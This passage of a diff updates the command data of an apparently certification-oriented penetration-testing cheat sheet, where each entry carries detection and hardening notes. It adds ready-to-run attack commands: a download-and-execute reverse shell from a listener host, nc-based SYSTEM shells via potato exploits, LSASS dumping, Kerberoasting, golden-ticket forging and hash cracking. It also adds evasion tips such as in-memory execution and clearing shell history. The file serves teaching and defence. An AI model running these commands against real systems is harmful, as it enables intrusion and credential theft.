         "prerequisites": "Network access to RDP (3389) and credential lists.",
         "impact": "Valid RDP credentials - interactive access to the host.",
         "detection": "Failed authentication bursts: Windows 4625 / Kerberos 4771 at abnormal rate; account lockouts (4740); many attempts from one source, or (spraying) one password across many accounts. Service-specific auth logs show the same spike. RDP shows 4625 (and 4776) failures then a 4624 type 10 on success.",
@@ -55333,37 +58362,32 @@ const COMMAND_DATA = {
         {
           "description": "Full recon (all modules)",
           "command": "./finalrecon.py --full --url http://<domain>",
-          "label": "finalrecon.py"
-        },
-        {
-          "description": "Headers + WHOIS only",
-          "command": "./finalrecon.py --headers --whois --url http://<domain>",
-          "label": "finalrecon.py"
+          "label": "Full scan"
         },
         {
           "description": "DNS enumeration + subdomain brute-force",
           "command": "./finalrecon.py --dns --sub --url http://<domain>",
-          "label": "finalrecon.py"
+          "label": "DNS + subdomains"
         },
         {
           "description": "SSL certificate info",
           "command": "./finalrecon.py --sslinfo --url https://<domain>",
-          "label": "finalrecon.py"
+          "label": "SSL info"
         },
         {
           "description": "Crawl + Wayback URLs",
           "command": "./finalrecon.py --crawl --wayback --url http://<domain>",
-          "label": "finalrecon.py"
+          "label": "Crawl + wayback"
         },
         {
           "description": "Fast port scan + directory search",
           "command": "./finalrecon.py --ps --dir --url http://<domain>",
-          "label": "finalrecon.py"
+          "label": "Port scan + dirs"
         },
         {
           "description": "Export results in JSON format",
           "command": "./finalrecon.py --full --url http://<domain> -o json",
-          "label": "finalrecon.py"
+          "label": "Full scan -> JSON"
         }
       ]
     },
@@ -56387,12 +59411,12 @@ const COMMAND_DATA = {
         {
           "description": "Credentialed scan (Windows — provides domain access for deeper findings)",
           "command": "# UI: Advanced Scan → Credentials tab → Windows → set domain\\user + password → Launch",
-          "label": "UI: Advanced Scan → Credentials ta…"
+          "label": "UI: add Windows creds"
         },
         {
           "description": "Credentialed scan (Linux SSH)",
           "command": "# UI: Advanced Scan → Credentials tab → SSH → set username + password/key → Launch",
-          "label": "UI: Advanced Scan → Credentials ta…"
+          "label": "UI: add SSH creds"
         },
         {
           "description": "Web Application Tests scan template",
@@ -57005,29 +60029,24 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "description": "Fetch robots.txt to find disallowed paths",
-          "command": "curl http://<domain>/robots.txt",
-          "label": "GET request"
-        },
-        {
           "description": "Fetch security.txt (contact/disclosure policy)",
           "command": "curl https://<domain>/.well-known/security.txt",
-          "label": "GET request"
+          "label": "GET security.txt"
         },
         {
           "description": "Fetch OpenID Connect discovery document (auth endpoints)",
           "command": "curl https://<domain>/.well-known/openid-configuration",
-          "label": "GET request"
+          "label": "GET openid-configuration"
         },
         {
           "description": "Fetch change-password well-known URI",
           "command": "curl https://<domain>/.well-known/change-password",
-          "label": "GET request"
+          "label": "GET change-password"
         },
         {
           "description": "Fetch sitemap.xml referenced in robots.txt",
           "command": "curl https://<domain>/sitemap.xml",
-          "label": "GET request"
+          "label": "GET sitemap.xml"
         }
       ]
     },
@@ -57983,7 +61002,17 @@ const COMMAND_DATA = {
         "misconfiguration": "MachineAccountQuota > 0 (any domain user can add computer accounts). GenericWrite on computer objects for non-admin groups. No monitoring of msDS-AllowedToActOnBehalfOfOtherIdentity modifications.",
         "vulnerable_config": "# MachineAccountQuota allows any user to create computer accounts (default = 10):\n(Get-ADDomain).MillionBytesPerSecond  # wrong attr\nGet-ADObject (Get-ADDomain).DistinguishedName -Properties 'ms-DS-MachineAccountQuota' | Select-Object 'ms-DS-MachineAccountQuota'\n# ms-DS-MachineAccountQuota : 10 → any domain user can add 10 computer accounts\n\n# GenericWrite on a computer object:\nGet-ObjectAcl -Identity 'SERVER01$' -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'GenericWrite'}",
         "secure_config": "# Set MachineAccountQuota to 0:\nSet-ADDomain -Identity corp.local -Replace @{'ms-DS-MachineAccountQuota' = 0}\n\n# Verify:\n(Get-ADDomain corp.local).'ms-DS-MachineAccountQuota'  # Should be 0\n\n# Remove GenericWrite ACEs on computer objects:\n# Audit with BloodHound: 'Find Computers where Domain Users can RDP' / custom ACL queries\n\n# Monitor RBCD attribute changes:\n# Enable DS Access auditing → Event 5136\n# SIEM: EventID=5136 AND AttributeLDAPDisplayName='msDS-AllowedToActOnBehalfOfOtherIdentity' → CRITICAL ALERT"
-      }
+      },
+      "variations": [
+        {
+          "label": "Set RBCD with PowerView",
+          "command": "Set-DomainRBCD -Identity <target_computer> -DelegateFrom '<attacker_computer>$' -Verbose"
+        },
+        {
+          "label": "Read back RBCD config",
+          "command": "Get-DomainRBCD"
+        }
+      ]
     },
     {
       "id": "ad-responder-poison",
@@ -58072,6 +61101,30 @@ const COMMAND_DATA = {
       },
       "tools": [
         "Responder"
+      ],
+      "variations": [
+        {
+          "label": "Analyze-only (no poisoning)",
+          "command": "sudo responder -I <interface> -A"
+        },
+        {
+          "label": "With WPAD + verbose",
+          "command": "sudo responder -I <interface> -wv"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Start poisoning LLMNR/NBT-NS/MDNS",
+          "command": "sudo responder -I <interface>"
+        },
+        {
+          "label": "Capture NTLMv2 hashes as victims resolve names",
+          "command": "# hashes land in /usr/share/responder/logs/"
+        },
+        {
+          "label": "Crack them",
+          "command": "hashcat -m 5600 <hashfile> /usr/share/wordlists/rockyou.txt"
+        }
       ]
     },
     {
@@ -58635,10 +61688,6 @@ const COMMAND_DATA = {
       "subcategory": "Reverse Shells",
       "variations": [
         {
-          "label": "Bash /dev/tcp",
-          "command": "bash -i >& /dev/tcp/<lhost>/<lport> 0>&1"
-        },
-        {
           "label": "Bash (fd 196)",
           "command": "0<&196;exec 196<>/dev/tcp/<lhost>/<lport>; sh <&196 >&196 2>&196"
         },
@@ -58753,6 +61802,10 @@ const COMMAND_DATA = {
         {
           "label": "Windows PowerShell",
           "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<lhost>',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\""
+        },
+        {
+          "label": "Windows Nishang Invoke-PowerShellTcp (download + exec)",
+          "command": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <lhost> -Port <lport>\""
         }
       ],
       "opsec": "loud",
@@ -58844,10 +61897,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "HTTP",
-          "command": "http://<ip>:<port>/index.php?language=http://<lhost>:<lport>/shell.php&cmd=id"
-        },
-        {
           "label": "FTP",
           "command": "http://<ip>:<port>/index.php?language=ftp://<lhost>/shell.php&cmd=id"
         },
@@ -58895,7 +61944,8 @@ const COMMAND_DATA = {
         "why_it_works": "Remote File Inclusion includes a URL (http://, ftp://, smb://) via include(). Requires allow_url_include=On. The attacker hosts shell.php on their own server; the vulnerable application fetches and executes it. HTTP, FTP, and SMB are all valid protocols. FTP bypasses http:// filters; SMB (\\\\IP\\share\\shell.php) works on Windows-hosted PHP applications. The remote PHP file executes with the web server's privileges.",
         "impact": "RCE — the remote shell executes on the server. More flexible than LFI-to-RCE chains because the payload is attacker-controlled and can be updated without re-exploiting. Enables reverse shell, lateral movement, persistence.",
         "detection": "[MITRE T1505.003] Network: outbound HTTP/FTP request from web server to external IP during page load. Firewall: web server process making outbound connections (unusual). PHP config: allow_url_include = Off blocks RFI — this is the primary fix. DNS: web server resolving attacker domain.",
-        "artifacts": "Access log: parameter with http://external-IP or ftp://external-IP. Web server outbound connection log: GET request to attacker HTTP server. Attacker server: access.log shows web server's IP fetching shell.php."
+        "artifacts": "Access log: parameter with http://external-IP or ftp://external-IP. Web server outbound connection log: GET request to attacker HTTP server. Attacker server: access.log shows web server's IP fetching shell.php.",
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
       }
     },
     {
@@ -58985,6 +62035,26 @@ const COMMAND_DATA = {
       },
       "tools": [
         "rpcclient"
+      ],
+      "variations": [
+        {
+          "label": "Enum domain users via RPC",
+          "command": "rpcclient -U \"\" -N <dc_ip> -c 'enumdomusers'"
+        },
+        {
+          "label": "Query a user by RID",
+          "command": "rpcclient -U \"\" -N <dc_ip> -c 'queryuser 0x1f4'"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Open a null session",
+          "command": "rpcclient -U \"\" -N <dc_ip>"
+        },
+        {
+          "label": "Enumerate users/groups",
+          "command": "rpcclient $> enumdomusers ; enumdomgroups"
+        }
       ]
     },
     {
@@ -59048,7 +62118,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "Sprays credentials over MS-RPC via rpcclient, useful from Linux without domain tooling.",
+        "why_it_works": "The service performs no (or weak) rate-limiting/lockout, so an attacker can submit many username/password guesses. Password reuse and weak/default passwords mean a modest wordlist often lands a valid credential. Each rpcclient bind tests one credential over SAMR; low-and-slow spraying avoids lockout.",
         "prerequisites": "A domain user list, candidate password(s), and network access to the auth service.",
         "impact": "Validated credentials over RPC.",
         "detection": "Failed-authentication bursts: Windows 4625 / Kerberos 4771; account lockouts (4740). Spraying = one password across MANY accounts (few failures each - a subtle, distributed pattern). Defender for Identity flags spraying.",
@@ -59065,6 +62135,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "rpcclient"
+      ],
+      "variations": [
+        {
+          "label": "Loop over a userlist",
+          "command": "for u in $(cat <userlist>); do rpcclient -U \"$u%<password>\" -c 'getusername;quit' <dc_ip> 2>&1 | grep -v NT_STATUS; done"
+        }
       ]
     },
     {
@@ -59233,10 +62309,6 @@ const COMMAND_DATA = {
           "command": "sudo nmap -sV -p 873 127.0.0.1\nnc -nv 127.0.0.1 873"
         },
         {
-          "label": "List a share",
-          "command": "rsync -av --list-only rsync://127.0.0.1/dev"
-        },
-        {
           "label": "Download a share",
           "command": "rsync -av rsync://127.0.0.1/dev"
         },
@@ -59263,7 +62335,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Services expose excessive information: version banners, supported auth methods, valid usernames via error responses. IPMI has no authentication (version 2.0 cipher 0 vulnerability). RSH/rexec trust .rhosts files. rsync shares readable anonymously. Oracle TNS allows remote poisoning in older versions.",
         "vulnerable_config": "# IPMI cipher 0 — no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data — auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS — version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
-        "secure_config": "# IPMI — disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync — require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec — disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS — disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)"
+        "secure_config": "# IPMI — disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync — require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec — disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS — disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)",
+        "evasion": "Use key/valid-cred auth so it blends with admin activity; avoid writing tools to disk — pipe commands over the session; clean shell history."
       }
     },
     {
@@ -59335,7 +62408,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "Rubeus asreproast requests AS-REPs for no-preauth accounts from a Windows foothold and outputs crackable hashes.",
+        "why_it_works": "If an account has 'Do not require Kerberos pre-authentication' set, the KDC returns an AS-REP whose encrypted portion is derived from the user's password hash — to ANY requester, no auth needed. That ciphertext is crackable offline (AS-REP roasting).",
         "prerequisites": "A domain context on Windows (Rubeus).",
         "impact": "Crackable AS-REP hashes for offline cracking.",
         "detection": "[MITRE T1558.004] Event 4768 (AS-REQ) with Pre-Authentication Type 0 and RC4 encryption; a request for an account with pre-auth disabled; a honeypot no-preauth account request is malicious.",
@@ -59352,6 +62425,26 @@ const COMMAND_DATA = {
       },
       "tools": [
         "Rubeus"
+      ],
+      "variations": [
+        {
+          "label": "Roast all vulnerable users",
+          "command": ".\\Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.txt"
+        },
+        {
+          "label": "Specific user",
+          "command": ".\\Rubeus.exe asreproast /user:<user> /format:hashcat /nowrap"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Roast",
+          "command": ".\\Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.txt"
+        },
+        {
+          "label": "Crack (hashcat 18200)",
+          "command": "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
+        }
       ]
     },
     {
@@ -59436,6 +62529,30 @@ const COMMAND_DATA = {
       },
       "tools": [
         "Rubeus"
+      ],
+      "variations": [
+        {
+          "label": "AES256 (stealthier than RC4)",
+          "command": ".\\Rubeus.exe golden /aes256:<child_krbtgt_aes> /domain:<child_domain> /sid:<child_sid> /sids:<parent_ea_sid> /user:Administrator /ptt"
+        },
+        {
+          "label": "Save ticket to file",
+          "command": ".\\Rubeus.exe golden /rc4:<child_krbtgt_hash> /domain:<child_domain> /sid:<child_sid> /sids:<parent_ea_sid> /user:Administrator /outfile:golden.kirbi"
+        }
+      ],
+      "steps": [
+        {
+          "label": "DCSync child krbtgt",
+          "command": "SafetyKatz.exe \"lsadump::dcsync /user:<child_domain>\\krbtgt\" \"exit\""
+        },
+        {
+          "label": "Forge + inject with EA SID history",
+          "command": ".\\Rubeus.exe golden /rc4:<hash> /domain:<child_domain> /sid:<child_sid> /sids:<parent_ea_sid> /user:Administrator /ptt"
+        },
+        {
+          "label": "Access parent DC",
+          "command": "dir \\\\<parent_dc>\\C$"
+        }
       ]
     },
     {
@@ -59515,7 +62632,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "Rubeus kerberoast requests TGS tickets for all SPN accounts and outputs crackable hashes from a Windows foothold.",
+        "why_it_works": "Kerberos issues a TGS for any requested SPN encrypted with the service account's key; because service accounts often have weak, non-expiring passwords, the returned tickets crack offline.",
         "prerequisites": "A domain context on Windows (Rubeus).",
         "impact": "Crackable TGS hashes for offline cracking of service-account passwords.",
         "detection": "[MITRE T1558.003] Event 4769 (TGS requested) with RC4 encryption type (0x17) when AES is standard, or a burst of TGS requests for many SPNs from one source in a short window; a request for a honeypot SPN account is malicious by definition.",
@@ -59532,6 +62649,38 @@ const COMMAND_DATA = {
       },
       "tools": [
         "Rubeus"
+      ],
+      "variations": [
+        {
+          "label": "OPSEC (skip AES accounts)",
+          "command": ".\\Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:hashes.txt"
+        },
+        {
+          "label": "Use current TGT (no creds)",
+          "command": ".\\Rubeus.exe kerberoast /tgtdeleg /nowrap"
+        },
+        {
+          "label": "Stats only",
+          "command": ".\\Rubeus.exe kerberoast /stats"
+        },
+        {
+          "label": "Include AES accounts (mode 19700)",
+          "command": ".\\Rubeus.exe kerberoast /aes /nowrap"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Request all TGS",
+          "command": ".\\Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:hashes.txt"
+        },
+        {
+          "label": "Crack offline",
+          "command": "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt"
+        },
+        {
+          "label": "Pivot as the service account",
+          "command": "# check local admin / delegation on its hosts"
+        }
       ]
     },
     {
@@ -59603,7 +62752,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "Rubeus kerberoast /user:<name> targets a single high-value SPN account, minimising ticket requests.",
+        "why_it_works": "A TGS for the target's SPN is encrypted under its password hash and any user can request it, so a weak service-account password cracks offline.",
         "prerequisites": "A domain context on Windows and a chosen target SPN account.",
         "impact": "A crackable TGS hash for one specific service account.",
         "detection": "[MITRE T1558.003] Event 4769 (TGS requested) with RC4 encryption type (0x17) when AES is standard, or a burst of TGS requests for many SPNs from one source in a short window; a request for a honeypot SPN account is malicious by definition. A single targeted 4769 is quieter than a bulk roast but still RC4-flaggable.",
@@ -59620,6 +62769,16 @@ const COMMAND_DATA = {
       },
       "tools": [
         "Rubeus"
+      ],
+      "variations": [
+        {
+          "label": "Simple output",
+          "command": ".\\Rubeus.exe kerberoast /user:<user> /simple /nowrap"
+        },
+        {
+          "label": "OPSEC single user",
+          "command": ".\\Rubeus.exe kerberoast /user:<user> /rc4opsec /nowrap /outfile:hash.txt"
+        }
       ]
     },
     {
@@ -59706,12 +62865,8 @@ const COMMAND_DATA = {
           "command": "Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<aes_key> /nowrap"
         },
         {
-          "label": "OverPass (RC4 + PtT)",
-          "command": "Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<nt_hash> /ptt"
-        },
-        {
           "label": "Inject Ticket",
-          "command": "Rubeus.exe ptt /ticket:<ticket.kirbi>"
+          "command": "Rubeus.exe ptt /ticket:<ticket>"
         },
         {
           "label": "Sacrificial Process",
@@ -59724,7 +62879,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Rubeus ptt injects a base64/.kirbi Kerberos ticket into the session (or requests then passes one) for PtT on Windows.",
+        "why_it_works": "A Kerberos TGT/TGS is a self-contained bearer token; injecting a valid ticket into the current logon session (pass-the-ticket) makes Windows authenticate as that user, because the KDC already signed it.",
         "prerequisites": "A valid/forged ticket (or the means to request one) and a Windows session.",
         "impact": "Authenticated access as the ticket's principal via PtT.",
         "detection": "[MITRE T1550.003] Anomalous Kerberos activity: a TGS used without a preceding TGT the DC issued; tickets with unusual lifetimes/encryption (RC4 where AES is standard); 4768/4769 anomalies; a ticket used from an unexpected host.",
@@ -59912,22 +63067,22 @@ const COMMAND_DATA = {
         {
           "description": "Find exposed file types (PDF, XLS, DOCX) on target site",
           "command": "site:<domain> (filetype:pdf OR filetype:xls OR filetype:docx)",
-          "label": "Docs/files dork"
+          "label": "Dork - docs/files"
         },
         {
           "description": "Find config files on target site",
           "command": "site:<domain> (inurl:config.php OR ext:conf OR ext:cnf)",
-          "label": "Docs/files dork"
+          "label": "Dork - config files"
         },
         {
           "description": "Find backup files or SQL dumps",
           "command": "site:<domain> (inurl:backup OR filetype:sql)",
-          "label": "Docs/files dork"
+          "label": "Dork - backups/SQL"
         },
         {
           "description": "Exclude a subdomain from results",
           "command": "site:<domain> -site:www.<domain>",
-          "label": "Exclude filter"
+          "label": "Exclude - other subdomains"
         },
         {
           "description": "Find cache/index of a page",
@@ -59947,7 +63102,7 @@ const COMMAND_DATA = {
         {
           "description": "Exclude irrelevant results with minus operator",
           "command": "site:news.com -inurl:sports",
-          "label": "Exclude filter"
+          "label": "Exclude - a path"
         }
       ]
     },
@@ -60024,10 +63179,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "NetExec",
-          "command": "nxc smb <ip> -u <user> -p '<password>' --spider <share> --content --pattern \"passw\""
-        },
-        {
           "label": "MANSPIDER",
           "command": "docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <ip> -c 'passw' -u '<user>' -p '<password>'"
         }
@@ -60038,7 +63189,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Spiders SMB shares (e.g. nxc spider_plus, manual) to enumerate and pull files that may hold credentials.",
+        "why_it_works": "Readable network shares often store sensitive files; spidering their content with pattern matching surfaces credentials and keys left accessible to all users.",
         "prerequisites": "Domain-user access and reachable shares.",
         "impact": "Files and embedded creds from accessible shares.",
         "detection": "[MITRE T1135] SMB tree-connects and file reads across many shares from one source (5140/5145 with auditing).",
@@ -60168,7 +63319,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Common introductory misconfigurations: services running as root/SYSTEM unnecessarily, default credentials unchanged, unnecessary services listening on all interfaces, lack of firewall rules exposing services externally, no monitoring or alerting on authentication failures.",
         "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces — should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
-        "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services"
+        "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services",
+        "evasion": "Vet and test the PoC off-target; run the final exploit once; remove any dropped files after."
       }
     },
     {
@@ -60345,6 +63497,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "impacket"
+      ],
+      "variations": [
+        {
+          "label": "Full DCSync with ticket",
+          "command": "KRB5CCNAME=<ccache> secretsdump.py -k -no-pass -just-dc <domain>/administrator@<dc_fqdn>"
+        }
       ]
     },
     {
@@ -60583,8 +63741,37 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1003.001",
           "MITRE T1078"
-        ]
-      }
+        ],
+        "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel."
+      },
+      "variations": [
+        {
+          "label": "comsvcs.dll MiniDump (LOLBAS)",
+          "command": "rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\lsass.dmp full"
+        },
+        {
+          "label": "nanodump (evasive)",
+          "command": "nanodump.exe --write C:\\lsass.dmp"
+        },
+        {
+          "label": "Parse offline with pypykatz",
+          "command": "pypykatz lsa minidump lsass.dmp"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Confirm SeDebugPrivilege",
+          "command": "whoami /priv | findstr SeDebug"
+        },
+        {
+          "label": "Dump LSASS",
+          "command": "procdump.exe -accepteula -ma lsass.exe lsass.dmp"
+        },
+        {
+          "label": "Exfil + parse offline (keeps mimikatz off the host)",
+          "command": "pypykatz lsa minidump lsass.dmp"
+        }
+      ]
     },
     {
       "type": "command",
@@ -60668,8 +63855,29 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M26",
           "MITRE T1134.002"
-        ]
-      }
+        ],
+        "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel."
+      },
+      "variations": [
+        {
+          "label": "Get-System via named pipe (PowerUp)",
+          "command": "Get-System -Technique NamedPipe"
+        },
+        {
+          "label": "Token duplication (PowerUp)",
+          "command": "Get-System -Technique Token"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Confirm SeDebug/SeImpersonate",
+          "command": "whoami /priv"
+        },
+        {
+          "label": "Duplicate a SYSTEM process token to spawn SYSTEM",
+          "command": "[MyProcess]::CreateProcessFromParent(<system_pid>,<command>)"
+        }
+      ]
     },
     {
       "type": "command",
@@ -60745,12 +63953,12 @@ const COMMAND_DATA = {
         {
           "command": ".\\SigmaPotato.exe --revshell <lhost> <lport>",
           "caption": "SigmaPotato: modern SeImpersonate exploit, works on Server 2019/2022 and Win10/11",
-          "label": ".\\SigmaPotato.exe"
+          "label": "SigmaPotato - reverse shell"
         },
         {
           "command": ".\\SigmaPotato.exe \"<command>\"",
           "caption": "SigmaPotato: run arbitrary command as SYSTEM",
-          "label": ".\\SigmaPotato.exe"
+          "label": "SigmaPotato - run a command"
         },
         {
           "command": ".\\GodPotato-NET4.exe -cmd \"cmd /c whoami\"",
@@ -60772,7 +63980,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1134.001",
           "MITRE T1068"
-        ]
+        ],
+        "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel."
       }
     },
     {
@@ -60875,8 +64084,37 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1134.001",
           "MITRE T1068"
-        ]
-      }
+        ],
+        "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel."
+      },
+      "variations": [
+        {
+          "label": "GodPotato (modern, works 2019/2022)",
+          "command": "GodPotato.exe -cmd \"cmd /c whoami\""
+        },
+        {
+          "label": "RoguePotato",
+          "command": "RoguePotato.exe -r <attacker_ip> -e \"C:\\tools\\nc.exe <lhost> <lport> -e cmd\" -l 9999"
+        },
+        {
+          "label": "EfsPotato",
+          "command": "EfsPotato.exe \"cmd /c whoami\""
+        }
+      ],
+      "steps": [
+        {
+          "label": "Confirm SeImpersonatePrivilege",
+          "command": "whoami /priv | findstr SeImpersonate"
+        },
+        {
+          "label": "Trigger the potato to get SYSTEM",
+          "command": "PrintSpoofer.exe -c \"c:\\tools\\nc.exe <lhost> <lport> -e cmd\""
+        },
+        {
+          "label": "Catch the SYSTEM shell",
+          "command": "# nc -lvnp <lport> on attacker"
+        }
+      ]
     },
     {
       "type": "command",
@@ -60974,7 +64212,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1543.003",
           "MITRE T1078.002"
-        ]
+        ],
+        "evasion": "Modify the service binPath, trigger once, then restore the original service configuration."
       }
     },
     {
@@ -61083,6 +64322,146 @@ const COMMAND_DATA = {
       ]
     },
     {
+      "id": "crtp-session-share-hunting",
+      "name": "Session & Share Hunting (SessionHunter / PowerHuntShares)",
+      "command": "Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access",
+      "description": "Find where privileged users are logged on and which shares expose sensitive data, to plan lateral movement. Invoke-SessionHunter queries remote registry (no admin) to map user->host sessions; PowerHuntShares/Invoke-HuntSMBShares inventories readable/writable SMB shares across a host list.",
+      "platform": "windows",
+      "category": "Active Directory",
+      "subcategory": "Domain Enumeration",
+      "type": "command",
+      "certifications": [
+        "CRTP"
+      ],
+      "source": "CRTP",
+      "opsec": "moderate",
+      "mitre": [
+        "T1049",
+        "T1135",
+        "T1033"
+      ],
+      "tools": [
+        "Invoke-SessionHunter",
+        "PowerHuntShares",
+        "PowerView"
+      ],
+      "tags": [
+        "session-hunting",
+        "share-hunting",
+        "user-hunting",
+        "lateral-movement-prep",
+        "enumeration",
+        "crtp"
+      ],
+      "variations": [
+        {
+          "label": "SessionHunter against a target list",
+          "command": "Invoke-SessionHunter -NoPortScan -RawResults -Targets <hostlist> | select Hostname,UserSession,Access"
+        },
+        {
+          "label": "PowerHuntShares - hunt SMB shares",
+          "command": "Invoke-HuntSMBShares -NoPing -OutputDirectory <out_dir> -HostList <hostlist>"
+        },
+        {
+          "label": "PowerView user-location fallback",
+          "command": "Find-DomainUserLocation -CheckAccess"
+        },
+        {
+          "label": "Check local admin on a host (multi-threaded)",
+          "command": "Invoke-CheckLocalAdminAccess"
+        },
+        {
+          "label": "Find WMI local admin access",
+          "command": "Find-WMILocalAdminAccess.ps1"
+        },
+        {
+          "label": "Enumerate a host's local Administrators group",
+          "command": "Get-NetLocalGroupMember -ComputerName <host> -GroupName Administrators"
+        },
+        {
+          "label": "PowerView file servers",
+          "command": "Get-DomainFileServer"
+        },
+        {
+          "label": "PowerView DFS shares",
+          "command": "Get-DomainDFSShare"
+        }
+      ],
+      "steps": [
+        {
